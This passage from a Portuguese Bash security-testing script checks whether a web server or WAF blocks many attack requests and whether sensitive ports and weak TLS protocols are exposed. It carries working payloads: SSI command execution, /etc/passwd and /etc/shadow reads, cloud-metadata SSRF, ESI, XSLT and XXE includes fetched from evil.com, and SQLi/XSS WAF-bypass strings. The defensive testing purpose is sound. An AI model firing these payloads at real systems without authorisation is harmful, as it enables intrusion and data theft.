    test_curl "H2C: Settings inválido" "block" -A "$UA" -Lk -H "Upgrade: h2c" -H "HTTP2-Settings: INVALID" -H "Connection: Upgrade" "$URL"
    test_curl "H2C: Settings malformado" "block" -A "$UA" -Lk -H "Upgrade: h2c" -H "HTTP2-Settings: ////" -H "Connection: Upgrade" "$URL"
    test_curl "H2C: Settings muito longo" "block" -A "$UA" -Lk -H "Upgrade: h2c" -H "HTTP2-Settings: $(head -c 1000 /dev/zero | base64)" -H "Connection: Upgrade" "$URL"
    
    print_subsection "H2C Tunnel para Serviços Internos"
    test_curl "H2C: Host interno" "block" -A "$UA" -Lk -H "Upgrade: h2c" -H "Host: localhost:8080" "$URL"
    test_curl "H2C: Host 127.0.0.1" "block" -A "$UA" -Lk -H "Upgrade: h2c" -H "Host: 127.0.0.1" "$URL"
    test_curl "H2C: Acesso a metadata" "block" -A "$UA" -Lk -H "Upgrade: h2c" -H "Host: 169.254.169.254" "$URL"
    
    print_subsection "H2C com Métodos Diferentes"
    test_curl "H2C: POST upgrade" "block" -A "$UA" -Lk -X POST -H "Upgrade: h2c" -H "Connection: Upgrade" "$URL"
    test_curl "H2C: PUT upgrade" "block" -A "$UA" -Lk -X PUT -H "Upgrade: h2c" -H "Connection: Upgrade" "$URL"
    test_curl "H2C: OPTIONS upgrade" "block" -A "$UA" -Lk -X OPTIONS -H "Upgrade: h2c" -H "Connection: Upgrade" "$URL"
    test_curl "H2C: CONNECT via h2c" "block" -A "$UA" -Lk -X CONNECT -H "Upgrade: h2c" "$URL"
}

#==============================================================================
# SSI / ESI INJECTION (Server/Edge Side Includes)
#==============================================================================
test_ssi_esi_injection() {
    print_section "📄 TESTES DE SSI / ESI INJECTION (30 testes)"
    
    print_subsection "Server-Side Includes (SSI)"
    test_curl "SSI: <!--#echo var" "block" -A "$UA" -Lk "${URL}?page=<!--%23echo%20var=%22DOCUMENT_ROOT%22-->"
    test_curl "SSI: <!--#exec cmd" "block" -A "$UA" -Lk "${URL}?page=<!--%23exec%20cmd=%22id%22-->"
    test_curl "SSI: <!--#exec cgi" "block" -A "$UA" -Lk "${URL}?page=<!--%23exec%20cgi=%22/cgi-bin/test.cgi%22-->"
    test_curl "SSI: <!--#include file" "block" -A "$UA" -Lk "${URL}?page=<!--%23include%20file=%22/etc/passwd%22-->"
    test_curl "SSI: <!--#include virtual" "block" -A "$UA" -Lk "${URL}?page=<!--%23include%20virtual=%22/admin%22-->"
    test_curl "SSI: <!--#config errmsg" "block" -A "$UA" -Lk "${URL}?page=<!--%23config%20errmsg=%22Error%22-->"
    test_curl "SSI: <!--#set var" "block" -A "$UA" -Lk "${URL}?page=<!--%23set%20var=%22x%22%20value=%22test%22-->"
    test_curl "SSI: <!--#printenv" "block" -A "$UA" -Lk "${URL}?page=<!--%23printenv-->"
    
    print_subsection "SSI em Headers"
    test_curl "SSI: User-Agent injection" "block" -Lk -A "<!--#exec cmd=\"id\"-->" "$URL"
    test_curl "SSI: Referer injection" "block" -A "$UA" -Lk -e "<!--#exec cmd=\"cat /etc/passwd\"-->" "$URL"
    test_curl "SSI: Cookie injection" "block" -A "$UA" -Lk --cookie "x=<!--#exec cmd=\"id\"-->" "$URL"
    
    print_subsection "Edge Side Includes (ESI)"
    test_curl "ESI: <esi:include src" "block" -A "$UA" -Lk "${URL}?page=<esi:include%20src=%22http://evil.com/steal%22/>"
    test_curl "ESI: <esi:include file" "block" -A "$UA" -Lk "${URL}?page=<esi:include%20src=%22/etc/passwd%22/>"
    test_curl "ESI: <esi:inline" "block" -A "$UA" -Lk "${URL}?page=<esi:inline%20name=%22test%22>content</esi:inline>"
    test_curl "ESI: <esi:comment" "block" -A "$UA" -Lk "${URL}?page=<esi:comment%20text=%22hidden%22/>"
    test_curl "ESI: <esi:remove" "block" -A "$UA" -Lk "${URL}?page=<esi:remove>content</esi:remove>"
    test_curl "ESI: <esi:try" "block" -A "$UA" -Lk "${URL}?page=<esi:try><esi:attempt><esi:include%20src=%22/test%22/></esi:attempt></esi:try>"
    test_curl "ESI: <esi:choose" "block" -A "$UA" -Lk "${URL}?page=<esi:choose><esi:when%20test=%22true%22>content</esi:when></esi:choose>"
    test_curl "ESI: <esi:vars" "block" -A "$UA" -Lk "${URL}?page=<esi:vars>\$(HTTP_COOKIE)</esi:vars>"
    
    print_subsection "ESI via Headers"
    test_curl "ESI: X-ESI-Header" "block" -A "$UA" -Lk -H "X-ESI: <esi:include src=\"/admin\"/>" "$URL"
    test_curl "ESI: Surrogate-Capability" "block" -A "$UA" -Lk -H "Surrogate-Capability: evil=\"ESI/1.0\"" "$URL"
    test_curl "ESI: Surrogate-Control" "block" -A "$UA" -Lk -H "Surrogate-Control: content=\"ESI/1.0\"" "$URL"
    
    print_subsection "SSI/ESI com Encoding"
    test_curl "SSI: URL encoded" "block" -A "$UA" -Lk "${URL}?x=%3C%21--%23exec+cmd%3D%22id%22--%3E"
    test_curl "SSI: Double encoded" "block" -A "$UA" -Lk "${URL}?x=%253C%2521--%2523exec+cmd%253D%2522id%2522--%253E"
    test_curl "ESI: URL encoded" "block" -A "$UA" -Lk "${URL}?x=%3Cesi%3Ainclude+src%3D%22http%3A%2F%2Fevil.com%22%2F%3E"
    test_curl "ESI: Unicode" "block" -A "$UA" -Lk "${URL}?x=\\u003cesi:include src=\"/test\"/\\u003e"
    
    print_subsection "Varnish/Akamai Specific"
    test_curl "ESI: Varnish syntax" "block" -A "$UA" -Lk "${URL}?page=<esi:include%20src=%22/\$(QUERY_STRING)%22/>"
    test_curl "ESI: Akamai debug" "block" -A "$UA" -Lk -H "Pragma: akamai-x-get-cache-key" "$URL"
    test_curl "ESI: Fastly debug" "block" -A "$UA" -Lk -H "Fastly-Debug: 1" "$URL"
}

#==============================================================================
# CDN / CLOUDFLARE BYPASS
#==============================================================================
test_cdn_bypass() {
    print_section "☁️ TESTES DE CDN / CLOUDFLARE BYPASS (25 testes)"
    
    echo -e "  ${YELLOW}ℹ️  Tentativas de descobrir IP real atrás de CDN/WAF${NC}"
    echo ""
    
    local host_part
    host_part=$(echo "$URL" | sed -E 's|https?://([^/]+).*|\1|')
    local base_host
    base_host=$(echo "$host_part" | sed -E 's|:[0-9]+$||')
    
    print_subsection "Headers para Bypass de CDN"
    test_curl "CDN Bypass: CF-Connecting-IP" "block" -A "$UA" -Lk -H "CF-Connecting-IP: 127.0.0.1" "$URL"
    test_curl "CDN Bypass: True-Client-IP" "block" -A "$UA" -Lk -H "True-Client-IP: 127.0.0.1" "$URL"
    test_curl "CDN Bypass: X-Client-IP" "block" -A "$UA" -Lk -H "X-Client-IP: 127.0.0.1" "$URL"
    test_curl "CDN Bypass: X-Cluster-Client-IP" "block" -A "$UA" -Lk -H "X-Cluster-Client-IP: 127.0.0.1" "$URL"
    test_curl "CDN Bypass: X-Real-IP interno" "block" -A "$UA" -Lk -H "X-Real-IP: 10.0.0.1" "$URL"
    test_curl "CDN Bypass: Fastly-Client-IP" "block" -A "$UA" -Lk -H "Fastly-Client-IP: 127.0.0.1" "$URL"
    test_curl "CDN Bypass: Akamai-Origin-Hop" "block" -A "$UA" -Lk -H "Akamai-Origin-Hop: 99" "$URL"
    
    print_subsection "Headers de Debug CDN"
    test_curl "CDN Debug: X-Debug" "block" -A "$UA" -Lk -H "X-Debug: 1" "$URL"
    test_curl "CDN Debug: X-Forwarded-Debug" "block" -A "$UA" -Lk -H "X-Forwarded-Debug: true" "$URL"
    test_curl "CDN Debug: Pragma: akamai-x-cache-on" "block" -A "$UA" -Lk -H "Pragma: akamai-x-cache-on" "$URL"
    test_curl "CDN Debug: X-Akamai-Debug" "block" -A "$UA" -Lk -H "X-Akamai-Debug: true" "$URL"
    test_curl "CDN Debug: Cloudflare CF-Worker" "block" -A "$UA" -Lk -H "CF-Worker: true" "$URL"
    
    print_subsection "DNS Rebinding / Origin Discovery"
    test_curl "Origin: Host: origin.\$base_host" "block" -A "$UA" -Lk -H "Host: origin.${base_host}" "$URL"
    test_curl "Origin: Host: direct.\$base_host" "block" -A "$UA" -Lk -H "Host: direct.${base_host}" "$URL"
    test_curl "Origin: Host: server.\$base_host" "block" -A "$UA" -Lk -H "Host: server.${base_host}" "$URL"
    test_curl "Origin: Host: www2.\$base_host" "block" -A "$UA" -Lk -H "Host: www2.${base_host}" "$URL"
    test_curl "Origin: Host: backend.\$base_host" "block" -A "$UA" -Lk -H "Host: backend.${base_host}" "$URL"
    
    print_subsection "WAF Bypass via Headers"
    test_curl "WAF Bypass: X-Originating-IP interno" "block" -A "$UA" -Lk -H "X-Originating-IP: [127.0.0.1]" "$URL"
    test_curl "WAF Bypass: X-Remote-IP" "block" -A "$UA" -Lk -H "X-Remote-IP: 127.0.0.1" "$URL"
    test_curl "WAF Bypass: X-Remote-Addr" "block" -A "$UA" -Lk -H "X-Remote-Addr: 127.0.0.1" "$URL"
    test_curl "WAF Bypass: X-ProxyUser-Ip" "block" -A "$UA" -Lk -H "X-ProxyUser-Ip: 127.0.0.1" "$URL"
    test_curl "WAF Bypass: Client-IP" "block" -A "$UA" -Lk -H "Client-IP: 127.0.0.1" "$URL"
    
    print_subsection "Cloudflare Specific"
    test_curl "CF Bypass: cdn-cgi path" "block" -A "$UA" -Lk "${URL}/cdn-cgi/trace"
    test_curl "CF Bypass: __cf_bm cookie" "block" -A "$UA" -Lk --cookie "__cf_bm=bypass" "$URL"
    test_curl "CF Bypass: cf_clearance" "block" -A "$UA" -Lk --cookie "cf_clearance=bypass" "$URL"
}

#==============================================================================
# XSLT SERVER-SIDE INJECTION
#==============================================================================
test_xslt_injection() {
    print_section "📝 TESTES DE XSLT SERVER-SIDE INJECTION (20 testes)"
    
    print_subsection "XSLT Básico em Parâmetros"
    test_curl "XSLT: xsl:value-of" "block" -A "$UA" -Lk "${URL}?xsl=<xsl:value-of%20select=\"document('/etc/passwd')\"/>"
    test_curl "XSLT: document()" "block" -A "$UA" -Lk "${URL}?xml=<?xml-stylesheet%20href=\"http://evil.com/xslt.xsl\"%20type=\"text/xsl\"?>"
    test_curl "XSLT: xsl:include" "block" -A "$UA" -Lk "${URL}?xsl=<xsl:include%20href=\"http://evil.com/evil.xsl\"/>"
    test_curl "XSLT: xsl:import" "block" -A "$UA" -Lk "${URL}?xsl=<xsl:import%20href=\"file:///etc/passwd\"/>"
    
    print_subsection "XSLT Command Execution"
    test_curl "XSLT: PHP function" "block" -A "$UA" -Lk "${URL}?xsl=<xsl:value-of%20select=\"php:function('system','id')\"/>"
    test_curl "XSLT: Java extension" "block" -A "$UA" -Lk "${URL}?xsl=<xsl:value-of%20select=\"Runtime.getRuntime().exec('id')\"/>"
    test_curl "XSLT: EXSLT dyn:evaluate" "block" -A "$UA" -Lk "${URL}?xsl=<xsl:value-of%20select=\"dyn:evaluate('system(\\\"id\\\")')\"/>"
    
    print_subsection "XSLT via Content-Type"
    test_curl "XSLT: XML Content-Type" "block" -A "$UA" -Lk -H "Content-Type: application/xml" -d '<?xml version="1.0"?><?xml-stylesheet type="text/xsl" href="http://evil.com/xslt.xsl"?><root/>' "$URL"
    test_curl "XSLT: XSLT Content-Type" "block" -A "$UA" -Lk -H "Content-Type: application/xslt+xml" -d '<xsl:stylesheet version="1.0"><xsl:template match="/"><xsl:value-of select="document(\"/etc/passwd\")"/></xsl:template></xsl:stylesheet>' "$URL"
    
    print_subsection "XSLT File Read"
    test_curl "XSLT: LFI /etc/passwd" "block" -A "$UA" -Lk "${URL}?xsl=<xsl:copy-of%20select=\"document('/etc/passwd')\"/>"
    test_curl "XSLT: LFI /etc/shadow" "block" -A "$UA" -Lk "${URL}?xsl=<xsl:copy-of%20select=\"document('/etc/shadow')\"/>"
    test_curl "XSLT: LFI via unparsed-text" "block" -A "$UA" -Lk "${URL}?xsl=<xsl:value-of%20select=\"unparsed-text('/etc/passwd')\"/>"
    
    print_subsection "XSLT SSRF"
    test_curl "XSLT: SSRF http" "block" -A "$UA" -Lk "${URL}?xsl=<xsl:copy-of%20select=\"document('http://169.254.169.254/latest/meta-data/')\"/>"
    test_curl "XSLT: SSRF localhost" "block" -A "$UA" -Lk "${URL}?xsl=<xsl:copy-of%20select=\"document('http://127.0.0.1:8080/')\"/>"
    test_curl "XSLT: SSRF file" "block" -A "$UA" -Lk "${URL}?xsl=<xsl:copy-of%20select=\"document('file:///etc/passwd')\"/>"
    
    print_subsection "XSLT em Headers"
    test_curl "XSLT: Accept header" "block" -A "$UA" -Lk -H "Accept: application/xslt+xml" "$URL"
    test_curl "XSLT: X-XSLT header" "block" -A "$UA" -Lk -H "X-XSLT-Template: http://evil.com/evil.xsl" "$URL"
    
    print_subsection "LibXML Specific"
    test_curl "XSLT: LibXML external entities" "block" -A "$UA" -Lk -H "Content-Type: text/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' "$URL"
    test_curl "XSLT: LibXML parameter entity" "block" -A "$UA" -Lk -H "Content-Type: text/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><foo/>' "$URL"
}

#==============================================================================
# WAF / PROXY PROTECTIONS BYPASS
#==============================================================================
test_waf_bypass() {
    print_section "🛡️ TESTES DE WAF / PROXY PROTECTIONS BYPASS (35 testes)"
    
    print_subsection "Encoding Bypass"
    test_curl "WAF: URL encoding básico" "block" -A "$UA" -Lk "${URL}?x=%3Cscript%3Ealert(1)%3C/script%3E"
    test_curl "WAF: Double URL encoding" "block" -A "$UA" -Lk "${URL}?x=%253Cscript%253Ealert(1)%253C/script%253E"
    test_curl "WAF: Triple URL encoding" "block" -A "$UA" -Lk "${URL}?x=%25253Cscript%25253Ealert(1)%25253C/script%25253E"
    test_curl "WAF: Unicode encoding" "block" -A "$UA" -Lk "${URL}?x=%u003Cscript%u003Ealert(1)"
    test_curl "WAF: UTF-8 overlong" "block" -A "$UA" -Lk "${URL}?x=%C0%BCscript%C0%BE"
    test_curl "WAF: Hex encoding" "block" -A "$UA" -Lk "${URL}?x=0x3C7363726970743E"
    test_curl "WAF: Mixed case" "block" -A "$UA" -Lk "${URL}?x=<ScRiPt>alert(1)</sCrIpT>"
    test_curl "WAF: Null byte" "block" -A "$UA" -Lk "${URL}?x=<scr%00ipt>alert(1)</script>"
    
    print_subsection "SQL Injection WAF Bypass"
    test_curl "WAF SQLi: Comentários inline" "block" -A "$UA" -Lk "${URL}?id=1'/**/OR/**/1=1--"
    test_curl "WAF SQLi: Tabs ao invés de espaços" "block" -A "$UA" -Lk "${URL}?id=1'%09OR%091=1--"
    test_curl "WAF SQLi: Newlines" "block" -A "$UA" -Lk "${URL}?id=1'%0AOR%0A1=1--"
    test_curl "WAF SQLi: Comentários aninhados" "block" -A "$UA" -Lk "${URL}?id=1'/*!50000OR*/1=1--"
    test_curl "WAF SQLi: Version specific" "block" -A "$UA" -Lk "${URL}?id=1'/*!OR*/1=1--"
    test_curl "WAF SQLi: Função alternativa" "block" -A "$UA" -Lk "${URL}?id=1'||1=1--"
    
    print_subsection "XSS WAF Bypass"
    test_curl "WAF XSS: SVG onload" "block" -A "$UA" -Lk "${URL}?x=<svg/onload=alert(1)>"
    test_curl "WAF XSS: IMG com tab" "block" -A "$UA" -Lk "${URL}?x=<img%09src=x%09onerror=alert(1)>"
    test_curl "WAF XSS: Event handler alternativo" "block" -A "$UA" -Lk "${URL}?x=<body%20onpageshow=alert(1)>"
    test_curl "WAF XSS: Data URI" "block" -A "$UA" -Lk "${URL}?x=<a%20href=data:text/html,<script>alert(1)</script>>"
    test_curl "WAF XSS: HTML entities" "block" -A "$UA" -Lk "${URL}?x=<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>"
    
    print_subsection "Header Manipulation Bypass"
    test_curl "WAF Bypass: Content-Type charset" "block" -A "$UA" -Lk -H "Content-Type: application/x-www-form-urlencoded; charset=ibm500" "$URL"
    test_curl "WAF Bypass: Transfer-Encoding obfuscado" "block" -A "$UA" -Lk -H "Transfer-Encoding: \tchunked" "$URL"
    test_curl "WAF Bypass: HTTP Parameter Pollution" "block" -A "$UA" -Lk "${URL}?id=1&id=2'OR'1'='1"
    
    print_subsection "HTTP Method Bypass"
    test_curl "WAF Bypass: X-HTTP-Method-Override" "block" -A "$UA" -Lk -H "X-HTTP-Method-Override: PUT" "$URL"
    test_curl "WAF Bypass: X-Method-Override" "block" -A "$UA" -Lk -H "X-Method-Override: DELETE" "$URL"
    test_curl "WAF Bypass: X-HTTP-Method" "block" -A "$UA" -Lk -H "X-HTTP-Method: TRACE" "$URL"
    
    print_subsection "Path Bypass"
    test_curl "WAF Bypass: /./admin" "block" -A "$UA" -Lk "${URL}/./admin"
    test_curl "WAF Bypass: //admin" "block" -A "$UA" -Lk "${URL}//admin"
    test_curl "WAF Bypass: /admin;.css" "block" -A "$UA" -Lk "${URL}/admin;.css"
    test_curl "WAF Bypass: /admin%20" "block" -A "$UA" -Lk "${URL}/admin%20"
    test_curl "WAF Bypass: /admin%09" "block" -A "$UA" -Lk "${URL}/admin%09"
    
    print_subsection "Size-Based Bypass"
    test_curl "WAF Bypass: Body muito grande" "block" -A "$UA" -Lk -X POST -d "\$(head -c 100000 /dev/zero | tr '\\0' 'A')&x=<script>alert(1)</script>" "$URL"
    test_curl "WAF Bypass: Muitos parâmetros" "block" -A "$UA" -Lk "${URL}?\$(for i in {1..100}; do echo -n \"p\$i=v&\"; done)evil=<script>alert(1)</script>"
    test_curl "WAF Bypass: Header muito longo" "block" -A "$UA" -Lk -H "X-Long: \$(head -c 10000 /dev/zero | tr '\\0' 'A')" "${URL}?x=<script>alert(1)</script>"
    
    print_subsection "Protocol-Level Bypass"
    test_curl "WAF Bypass: HTTP/0.9" "block" -A "$UA" -Lk --http0.9 "$URL" 2>/dev/null || true
    test_curl "WAF Bypass: Absolute URI" "block" -A "$UA" -Lk "${URL}?x=<script>alert(1)</script>" -H "Host: "
}

#==============================================================================
# EXPOSED PORTS CHECK (Serviços que devem estar limitados a localhost)
#==============================================================================
test_exposed_ports() {
    print_section "🔌 TESTES DE PORTAS EXPOSTAS (Serviços Sensíveis)"
    
    echo -e "  ${YELLOW}ℹ️  Verificando portas de serviços que NÃO devem estar expostos externamente${NC}"
    echo -e "  ${YELLOW}   Esses serviços devem estar limitados a localhost (127.0.0.1)${NC}"
    echo ""
    
    # Extrair host da URL
    local host_part
    host_part=$(echo "$URL" | sed -E 's|https?://([^/:]+).*|\1|')
    
    # Verificar se nc está disponível
    if ! command -v nc &> /dev/null; then
        echo -e "  ${RED}❌ netcat (nc) não encontrado. Instale com: apt install netcat-openbsd${NC}"
        return
    fi
    
    # Função auxiliar para testar porta
    test_port() {
        local port="$1"
        local service="$2"
        local risk="$3"
        local result_text=""
        
        TOTAL_TESTS=$((TOTAL_TESTS + 1))
        
        # Timeout de 3 segundos para verificar a porta
        if nc -z -w 3 "$host_part" "$port" 2>/dev/null; then
            # Porta aberta - isso é RUIM para serviços internos
            result_text="FAIL"
            FAILED_TESTS=$((FAILED_TESTS + 1))
            [ -n "$OUTPUT_FILE" ] && echo "[FAIL] Porta $port ($service) - EXPOSTA" >> "$OUTPUT_FILE"
            
            # Aplicar filtro
            if [ "$FILTER" = "all" ] || [ "$FILTER" = "fail" ]; then
                echo -e "  ${RED}[✗]${NC} Porta $port ($service) - ${RED}EXPOSTA${NC} - $risk"
            fi
        else
            # Porta fechada ou filtrada - isso é BOM
            result_text="PASS"
            PASSED_TESTS=$((PASSED_TESTS + 1))
            [ -n "$OUTPUT_FILE" ] && echo "[PASS] Porta $port ($service) - Protegida" >> "$OUTPUT_FILE"
            
            # Aplicar filtro
            if [ "$FILTER" = "all" ] || [ "$FILTER" = "pass" ]; then
                echo -e "  ${GREEN}[✓]${NC} Porta $port ($service) - ${GREEN}PROTEGIDA${NC}"
            fi
        fi
    }
    
    print_subsection "Bancos de Dados (CRÍTICO)"
    test_port 3306 "MySQL/MariaDB" "Acesso direto ao banco de dados"
    test_port 5432 "PostgreSQL" "Acesso direto ao banco de dados"
    test_port 27017 "MongoDB" "Data theft, ransomware attacks"
    test_port 1433 "MSSQL" "Acesso direto ao banco SQL Server"
    test_port 1521 "Oracle" "Acesso direto ao banco Oracle"
    
    print_subsection "Cache e Message Queue (CRÍTICO)"
    test_port 6379 "Redis" "RCE, data theft (sem auth por padrão)"
    test_port 11211 "Memcached" "DDoS amplification, cache theft"
    test_port 5672 "RabbitMQ AMQP" "Message queue access"
    test_port 15672 "RabbitMQ Admin" "Admin panel exposure"
    
    print_subsection "Search Engines e Key-Value Stores"
    test_port 9200 "Elasticsearch HTTP" "Index access, potential RCE"
    test_port 9300 "Elasticsearch Transport" "Cluster access"
    test_port 7474 "Neo4j HTTP" "Graph database access"
    test_port 8529 "ArangoDB" "Multi-model database access"
    test_port 7000 "Cassandra" "NoSQL database access"
    test_port 9042 "Cassandra CQL" "CQL native protocol"
    
    print_subsection "Container e Orquestração (CRÍTICO)"
    test_port 2375 "Docker API (HTTP)" "RCE completo - container escape"
    test_port 2376 "Docker API (HTTPS)" "RCE completo - container escape"
    test_port 2379 "etcd Client" "Kubernetes secrets exposure"
    test_port 2380 "etcd Peer" "etcd cluster access"
    test_port 6443 "Kubernetes API" "Cluster takeover"
    test_port 10250 "Kubelet" "Node access, pod execution"
    test_port 10255 "Kubelet Read-Only" "Pod information leak"
    
    print_subsection "Aplicações e Desenvolvimento"
    test_port 9000 "PHP-FPM" "RCE se exposto"
    test_port 8080 "HTTP Alt (Dev/Tomcat)" "Aplicações não protegidas"
    test_port 8443 "HTTPS Alt" "Aplicações não protegidas"
    test_port 3000 "Node.js Dev" "Dev server exposure"
    test_port 5000 "Flask/Python Dev" "Dev server exposure"
    test_port 4000 "Dev Server" "Dev server exposure"
    test_port 9090 "Prometheus" "Metrics exposure"
    test_port 3100 "Grafana Loki" "Log data exposure"
    
    print_subsection "Administração e Monitoramento"
    test_port 8000 "Django Dev" "Dev server exposure"
    test_port 9001 "Supervisor" "Process control"
    test_port 61616 "ActiveMQ" "Message broker access"
    test_port 8161 "ActiveMQ Admin" "Admin console"
    test_port 50070 "Hadoop NameNode" "HDFS access"
    test_port 8088 "Hadoop YARN" "Resource manager"
    
    print_subsection "Mail e Outros Serviços"
    test_port 25 "SMTP" "Email relay abuse"
    test_port 587 "SMTP Submission" "Email relay"
    test_port 110 "POP3" "Email access"
    test_port 143 "IMAP" "Email access"
    test_port 21 "FTP" "Unencrypted file transfer"
    test_port 23 "Telnet" "Unencrypted remote access"
    test_port 69 "TFTP" "Trivial FTP (no auth)"
    
    print_subsection "Remote Access (verificar proteção)"
    test_port 22 "SSH" "Brute force (verificar fail2ban)"
    test_port 3389 "RDP" "Windows Remote Desktop"
    test_port 5900 "VNC" "Remote desktop"
    test_port 5901 "VNC :1" "Remote desktop"
    
    echo ""
    echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "  ${BOLD}💡 Recomendações de Hardening:${NC}"
    echo -e "  ${YELLOW}• MySQL/MariaDB:${NC} bind-address = 127.0.0.1 em /etc/mysql/my.cnf"
    echo -e "  ${YELLOW}• Redis:${NC} bind 127.0.0.1 e requirepass em /etc/redis/redis.conf"
    echo -e "  ${YELLOW}• PostgreSQL:${NC} listen_addresses = 'localhost' em postgresql.conf"
    echo -e "  ${YELLOW}• MongoDB:${NC} bindIp: 127.0.0.1 em /etc/mongod.conf"
    echo -e "  ${YELLOW}• Elasticsearch:${NC} network.host: 127.0.0.1 em elasticsearch.yml"
    echo -e "  ${YELLOW}• PHP-FPM:${NC} listen = 127.0.0.1:9000 ou unix socket"
    echo -e "  ${YELLOW}• Docker:${NC} Nunca expor o socket sem TLS e autenticação"
    echo -e "  ${YELLOW}• Firewall:${NC} Use nftables/iptables para bloquear portas desnecessárias"
    echo -e "  ${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

#==============================================================================
# SSL/TLS SECURITY TESTS
#==============================================================================
test_ssl_tls() {
    print_section "🔒 TESTES DE SEGURANÇA SSL/TLS"
    
    echo -e "  ${YELLOW}ℹ️  Verificando versões de protocolo, ciphers e curvas ECDH${NC}"
    echo ""
    
    # Extrair host e porta da URL
    local host_part port protocol
    host_part=$(echo "$URL" | sed -E 's|https?://([^/:]+).*|\1|')
    
    if [[ "$URL" == https://* ]]; then
        port=$(echo "$URL" | sed -E 's|https://[^:]+:([0-9]+).*|\1|')
        [[ "$port" == "$URL" ]] && port="443"
        protocol="https"
    else
        echo -e "  ${YELLOW}⚠️  URL não é HTTPS. Testes SSL/TLS requerem conexão segura.${NC}"
        return
    fi
    
    # Verificar se openssl está disponível
    if ! command -v openssl &> /dev/null; then
        echo -e "  ${RED}❌ openssl não encontrado. Instale com: apt install openssl${NC}"
        return
    fi
    
    # Função auxiliar para testar protocolo SSL/TLS
    test_protocol() {
        local proto="$1"
        local proto_name="$2"
        local should_fail="$3"  # "yes" = protocolo deve ser bloqueado
        local result_text=""
        
        TOTAL_TESTS=$((TOTAL_TESTS + 1))
        
        local result
        result=$(echo | timeout 5 openssl s_client -connect "${host_part}:${port}" -${proto} 2>&1)
        
        if echo "$result" | grep -q "Cipher is"; then
            # Conexão bem sucedida
            if [ "$should_fail" = "yes" ]; then
                result_text="FAIL"
                FAILED_TESTS=$((FAILED_TESTS + 1))
                [ -n "$OUTPUT_FILE" ] && echo "[FAIL] $proto_name - Protocolo vulnerável aceito" >> "$OUTPUT_FILE"
                if [ "$FILTER" = "all" ] || [ "$FILTER" = "fail" ]; then
                    echo -e "  ${RED}[✗]${NC} $proto_name - ${RED}VULNERÁVEL${NC} (protocolo obsoleto aceito!)"
                fi
            else
                result_text="PASS"
                PASSED_TESTS=$((PASSED_TESTS + 1))
                [ -n "$OUTPUT_FILE" ] && echo "[PASS] $proto_name - Suportado" >> "$OUTPUT_FILE"
                if [ "$FILTER" = "all" ] || [ "$FILTER" = "pass" ]; then
                    echo -e "  ${GREEN}[✓]${NC} $proto_name - ${GREEN}SUPORTADO${NC}"
                fi
            fi
        else
            # Conexão falhou
            if [ "$should_fail" = "yes" ]; then
                result_text="PASS"
                PASSED_TESTS=$((PASSED_TESTS + 1))
                [ -n "$OUTPUT_FILE" ] && echo "[PASS] $proto_name - Corretamente bloqueado" >> "$OUTPUT_FILE"
                if [ "$FILTER" = "all" ] || [ "$FILTER" = "pass" ]; then
                    echo -e "  ${GREEN}[✓]${NC} $proto_name - ${GREEN}BLOQUEADO${NC} (correto!)"
                fi
            else
                [ -n "$OUTPUT_FILE" ] && echo "[INFO] $proto_name - Não suportado" >> "$OUTPUT_FILE"
                if [ "$FILTER" = "all" ]; then
                    echo -e "  ${YELLOW}[?]${NC} $proto_name - ${YELLOW}NÃO SUPORTADO${NC}"
                fi
            fi
        fi
    }
    
    # Função para testar cipher suite
    test_cipher() {
        local cipher="$1"
        local cipher_name="$2"
        local should_fail="$3"
        local result_text=""
        
        TOTAL_TESTS=$((TOTAL_TESTS + 1))
        
        local result
        result=$(echo | timeout 5 openssl s_client -connect "${host_part}:${port}" -cipher "$cipher" 2>&1)
        
        if echo "$result" | grep -q "Cipher is"; then
            if [ "$should_fail" = "yes" ]; then
                local used_cipher
                used_cipher=$(echo "$result" | grep "Cipher is" | awk '{print $NF}')
                result_text="FAIL"
                FAILED_TESTS=$((FAILED_TESTS + 1))
                [ -n "$OUTPUT_FILE" ] && echo "[FAIL] $cipher_name - Cipher fraco aceito: $used_cipher" >> "$OUTPUT_FILE"
                if [ "$FILTER" = "all" ] || [ "$FILTER" = "fail" ]; then
                    echo -e "  ${RED}[✗]${NC} $cipher_name - ${RED}VULNERÁVEL${NC} (usando: $used_cipher)"
                fi
            else
                result_text="PASS"
                PASSED_TESTS=$((PASSED_TESTS + 1))
                if [ "$FILTER" = "all" ] || [ "$FILTER" = "pass" ]; then
                    echo -e "  ${GREEN}[✓]${NC} $cipher_name - ${GREEN}SUPORTADO${NC}"
                fi
            fi
        else
            if [ "$should_fail" = "yes" ]; then
                result_text="PASS"
                PASSED_TESTS=$((PASSED_TESTS + 1))
                [ -n "$OUTPUT_FILE" ] && echo "[PASS] $cipher_name - Corretamente bloqueado" >> "$OUTPUT_FILE"
                if [ "$FILTER" = "all" ] || [ "$FILTER" = "pass" ]; then
                    echo -e "  ${GREEN}[✓]${NC} $cipher_name - ${GREEN}BLOQUEADO${NC}"
                fi
            else
                if [ "$FILTER" = "all" ]; then
                    echo -e "  ${YELLOW}[?]${NC} $cipher_name - ${YELLOW}NÃO SUPORTADO${NC}"
                fi
            fi
        fi
    }
    
    print_subsection "Versões de Protocolo (Vulneráveis devem ser BLOQUEADOS)"
    
    # SSLv2 - CRÍTICO: Totalmente inseguro
    test_protocol "ssl2" "SSLv2 (CRÍTICO - POODLE, DROWN)" "yes" 2>/dev/null || \
        echo -e "  ${GREEN}[✓]${NC} SSLv2 - ${GREEN}NÃO COMPILADO${NC} (openssl moderno)"
    
    # SSLv3 - CRÍTICO: POODLE vulnerability
    test_protocol "ssl3" "SSLv3 (CRÍTICO - POODLE)" "yes" 2>/dev/null || \
        echo -e "  ${GREEN}[✓]${NC} SSLv3 - ${GREEN}NÃO COMPILADO${NC} (openssl moderno)"
    
    # TLSv1.0 - Vulnerável: BEAST, POODLE
    test_protocol "tls1" "TLSv1.0 (Vulnerável - BEAST)" "yes"
    
    # TLSv1.1 - Deprecated: Fraco
    test_protocol "tls1_1" "TLSv1.1 (Deprecated)" "yes"
    
